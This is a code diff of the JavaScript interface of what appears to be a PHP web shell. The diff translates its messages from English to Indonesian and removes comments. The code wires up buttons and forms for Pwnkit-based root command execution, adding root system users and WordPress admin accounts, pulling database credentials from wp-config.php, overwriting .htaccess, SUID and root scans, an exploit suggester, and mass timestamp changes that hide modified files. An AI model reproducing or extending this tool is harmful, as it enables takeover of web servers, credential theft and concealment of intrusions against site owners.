+                statusEl.textContent = 'Mencoba mendapatkan akses root...';
                 statusEl.className = 'alert alert-info';
-                promptEl.textContent = '#'; // Assume root for now, will update after check
+                promptEl.textContent = '#';
                 const fd = new FormData();
                 fd.append('action', 'check_pwnkit_status');
                 ajaxRequest(fd, data => {
-                    isPwnkitVulnerable = data.vulnerable; // Update global state
+                    isPwnkitVulnerable = data.vulnerable;
                     statusEl.textContent = data.message;
                     statusEl.className = `alert ${isPwnkitVulnerable ? 'alert-success' : 'alert-danger'}`;
-                    promptEl.textContent = isPwnkitVulnerable ? '#' : '$'; // Update prompt based on actual vulnerability
+                    promptEl.textContent = isPwnkitVulnerable ? '#' : '$';
                 });
-            } else { // currentConsoleMode === 'user'
-                statusEl.textContent = 'Regular console (auto-detects root access).';
+            } else {
+                statusEl.textContent = 'Konsol reguler (mendeteksi akses root secara otomatis).';
                 statusEl.className = 'alert alert-secondary';
-                promptEl.textContent = '$'; // Start with user prompt
-                // Still run the Pwnkit check in background for "smart" behavior if user types a root command
+                promptEl.textContent = '$';
                 const fd = new FormData();
                 fd.append('action', 'check_pwnkit_status');
                 ajaxRequest(fd, data => {
                     isPwnkitVulnerable = data.vulnerable;
                     if (isPwnkitVulnerable) {
                          promptEl.textContent = '#';
-                         statusEl.textContent = 'Regular console (root access detected, # prompt).';
+                         statusEl.textContent = 'Konsol reguler (akses root terdeteksi, prompt #).';
                          statusEl.className = 'alert alert-success';
                     }
                 });
@@ -1640,21 +1559,17 @@ document.addEventListener('DOMContentLoaded', function() {
             let actionToUse = 'cmd';
             let displayPrompt = '$';
 
-            // Determine action based on currently selected mode (Root Shell button pressed)
-            // AND the actual Pwnkit vulnerability status.
             if (currentConsoleMode === 'root') {
                 if (isPwnkitVulnerable) {
                     actionToUse = 'root_cmd';
                     displayPrompt = '#';
                 } else {
-                    // If root shell forced but not vulnerable, still try normal cmd but warn
                     actionToUse = 'cmd';
-                    displayPrompt = '$'; // Show user prompt if root isn't available
-                    cmdOutput.innerHTML += `<span style="color:var(--danger-color);">Failed to get root access. Running as regular user.</span>\n`;
+                    displayPrompt = '$';
+                    cmdOutput.innerHTML += `<span style="color:var(--danger-color);">Gagal mendapatkan akses root. Berjalan sebagai pengguna biasa.</span>\n`;
                 }
-            } else { // currentConsoleMode === 'user'
+            } else {
                 if (isPwnkitVulnerable) {
-                    // If in user mode but root is detected, still use root_cmd for powerful commands
                     actionToUse = 'root_cmd';
                     displayPrompt = '#';
                 } else {
@@ -1679,35 +1594,35 @@ document.addEventListener('DOMContentLoaded', function() {
     const destroyerBtn = document.getElementById('destroyerBtn');
     if(destroyerBtn) {
         destroyerBtn.addEventListener('click',e=>{e.preventDefault();
-        if(confirm('ARE YOU SURE? This will overwrite the .htaccess file.')){
-            const o=document.getElementById('securityOutput');o.innerText='Activating...';o.classList.remove('d-none');const fd=new FormData();fd.append('action','backdoor_destroyer');ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');o.innerText=d.message;});}});
+        if(confirm('APAKAH ANDA YAKIN? Ini akan menimpa berkas .htaccess.')){
+            const o=document.getElementById('securityOutput');o.innerText='Mengaktifkan...';o.classList.remove('d-none');const fd=new FormData();fd.append('action','backdoor_destroyer');ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');o.innerText=d.message;});}});
     }
 
     const lockItemForm = document.getElementById('lockItemForm');
     if(lockItemForm) {
-        lockItemForm.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('securityOutput');o.innerText='Locking item...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','lock_item');ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');o.innerText=d.message;});});
+        lockItemForm.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('securityOutput');o.innerText='Mengunci item...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','lock_item');ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');o.innerText=d.message;});});
     }
     
     const addRootUserForm = document.getElementById('addRootUserForm');
     if(addRootUserForm) {
-        addRootUserForm.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('usersOutput');o.innerText='Attempting to add root user...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','add_root_user');ajaxRequest(fd,d=>{o.innerText=d.output||d.message;});});
+        addRootUserForm.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('usersOutput');o.innerText='Mencoba menambahkan pengguna root...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','add_root_user');ajaxRequest(fd,d=>{o.innerText=d.output||d.message;});});
     }
 
     const addWpUserForm = document.getElementById('addWpUserForm');
     if(addWpUserForm) {
-        addWpUserForm.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('usersOutput');o.innerText='Attempting to add WordPress admin...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','add_wp_user');ajaxRequest(fd,d=>{o.innerText=d.output||d.message;});});
+        addWpUserForm.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('usersOutput');o.innerText='Mencoba menambahkan admin WordPress...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','add_wp_user');ajaxRequest(fd,d=>{o.innerText=d.output||d.message;});});
     }
 
     const parseWpConfigBtn = document.getElementById('parseWpConfigBtn');
     if(parseWpConfigBtn) {
-        parseWpConfigBtn.addEventListener('click', e => { e.preventDefault(); const o = document.getElementById('usersOutput'); o.innerText = 'Searching for wp-config.php...'; o.classList.remove('d-none'); const fd = new FormData(); fd.append('action', 'parse_wp_config'); const manualPath = document.getElementById('wpConfigPath').value; if(manualPath) fd.append('config_path', manualPath); ajaxRequest(fd, d => { if(d.status === 'ok') { o.innerText = 'Successfully parsed credentials from: ' .concat(d.path); document.getElementById('db_host').value = d.creds.db_host || ''; document.getElementById('db_name').value = d.creds.db_name || ''; document.getElementById('db_user').value = d.creds.db_user || ''; document.getElementById('db_pass').value = d.creds.db_password || ''; } else { o.innerText = d.message; } }); });
+        parseWpConfigBtn.addEventListener('click', e => { e.preventDefault(); const o = document.getElementById('usersOutput'); o.innerText = 'Mencari wp-config.php...'; o.classList.remove('d-none'); const fd = new FormData(); fd.append('action', 'parse_wp_config'); const manualPath = document.getElementById('wpConfigPath').value; if(manualPath) fd.append('config_path', manualPath); ajaxRequest(fd, d => { if(d.status === 'ok') { o.innerText = 'Berhasil mengurai kredensial dari: ' .concat(d.path); document.getElementById('db_host').value = d.creds.db_host || ''; document.getElementById('db_name').value = d.creds.db_name || ''; document.getElementById('db_user').value = d.creds.db_user || ''; document.getElementById('db_pass').value = d.creds.db_password || ''; } else { o.innerText = d.message; } }); });
     }
 
     const startAutoScanBtn = document.getElementById('startAutoScanBtn');
     if(startAutoScanBtn) {
         startAutoScanBtn.addEventListener('click', () => {
             const outputEl = document.getElementById('autoScanOutput');
-            outputEl.innerHTML = 'Starting auto root scan...<br>This may take a moment.';
+            outputEl.innerHTML = 'Memulai pemindaian root otomatis...<br>Ini mungkin memakan waktu sebentar.';
             outputEl.classList.remove('d-none');
             const fd = new FormData();
             fd.append('action', 'scan_root');
@@ -1723,7 +1638,7 @@ document.addEventListener('DOMContentLoaded', function() {
     if(startSuidScanBtn) {
         startSuidScanBtn.addEventListener('click', () => {
             const outputEl = document.getElementById('suidScanOutput');
-            outputEl.innerHTML = 'Scanning for SUID files...<br>This may take a moment.';
+            outputEl.innerHTML = 'Memindai berkas SUID...<br>Ini mungkin memakan waktu sebentar.';
             outputEl.classList.remove('d-none');
             const fd = new FormData();
             fd.append('action', 'scan_suid');
@@ -1739,7 +1654,7 @@ document.addEventListener('DOMContentLoaded', function() {
     if(startExploitSuggesterBtn) {
         startExploitSuggesterBtn.addEventListener('click', () => {
             const outputEl = document.getElementById('exploitSuggesterOutput');
-            outputEl.innerHTML = 'Running exploit suggester...<br>This requires internet access and may take a while.';
+            outputEl.innerHTML = 'Menjalankan penyaran eksploitasi...<br>Ini membutuhkan akses internet dan mungkin memakan waktu.';
             outputEl.classList.remove('d-none');
             const fd = new FormData();
             fd.append('action', 'exploit_suggester');
@@ -1751,53 +1666,49 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
-    // Function to display touch modal (change timestamp)
     window.showTouchModal = function(filePath, currentMtime) {
-        const modal = modals['touchModal']; // Use the already created modal instance
+        const modal = modals['touchModal'];
         const form = document.getElementById('touchForm');
         form.querySelector('input[name="file_to_touch_name"]').value = filePath;
         form.querySelector('input[name="datetime_value"]').value = currentMtime;
         modal.show();
     };
 
-    // Event listener for touch form (change timestamp)
     const touchForm = document.getElementById('touchForm');
     if (touchForm) {
         touchForm.addEventListener('submit', async function(e) {
             e.preventDefault();
             const formData = new FormData(this);
-            formData.append('action', 'touch_item'); // Corresponding PHP action
+            formData.append('action', 'touch_item');
             ajaxRequest(formData, d => {
                 showToast(d.message, d.status === 'ok' ? 'success' : 'danger');
                 if (d.status === 'ok') {
-                    modals['touchModal'].hide(); // Close modal
-                    setTimeout(() => location.reload(), 1e3); // Reload page to see changes
+                    modals['touchModal'].hide();
+                    setTimeout(() => location.reload(), 1e3);
                 }
             });
         });
     }
 
-    // Function to display chmod modal (change permissions)
     window.showChmodModal = function(itemPath, currentPerms) {
         const modal = modals['chmodModal'];
         const form = document.getElementById('chmodForm');
         form.querySelector('input[name="target_path"]').value = itemPath;
-        form.querySelector('input[name="perms_octal"]').value = currentPerms.replace(/[^0-7]/g, '').slice(-4); // Clean and get last 4 octal digits
+        form.querySelector('input[name="perms_octal"]').value = currentPerms.replace(/[^0-7]/g, '').slice(-4);
         modal.show();
     };
 
-    // Event listener for chmod form (change permissions)
     const chmodForm = document.getElementById('chmodForm');
     if (chmodForm) {
         chmodForm.addEventListener('submit', async function(e) {
             e.preventDefault();
             const formData = new FormData(this);
-            formData.append('action', 'chmod_item'); // Corresponding PHP action
+            formData.append('action', 'chmod_item');
             ajaxRequest(formData, d => {
                 showToast(d.message, d.status === 'ok' ? 'success' : 'danger');
                 if (d.status === 'ok') {
                     modals['chmodModal'].hide();
-                    setTimeout(() => location.reload(), 1e3); // Reload page to see changes
+                    setTimeout(() => location.reload(), 1e3);
                 }
             });
         });
@@ -1808,7 +1719,7 @@ document.addEventListener('DOMContentLoaded', function() {
         massDateTimeChangeForm.addEventListener('submit', async function(e) {
             e.preventDefault();
             const outputEl = document.getElementById('massDateTimeChangeOutput');
-            outputEl.innerHTML = 'Starting mass date/time change...<br>This may take a moment.';
+            outputEl.innerHTML = 'Memulai perubahan tanggal/waktu massal...<br>Ini mungkin memakan waktu sebentar.';
             outputEl.classList.remove('d-none');
             const formData = new FormData(this);
             formData.append('action', 'mass_datetime_change');
@@ -1817,11 +1728,11 @@ document.addEventListener('DOMContentLoaded', function() {
                 outputEl.innerText = d.output || d.message;
                 outputEl.scrollTop = outputEl.scrollHeight;
                 if (d.status === 'ok') {
-                    // Optionally close modal or refresh, but showing output is more informative
                 }
             });
         });
     }
 });
 </script>
+
 
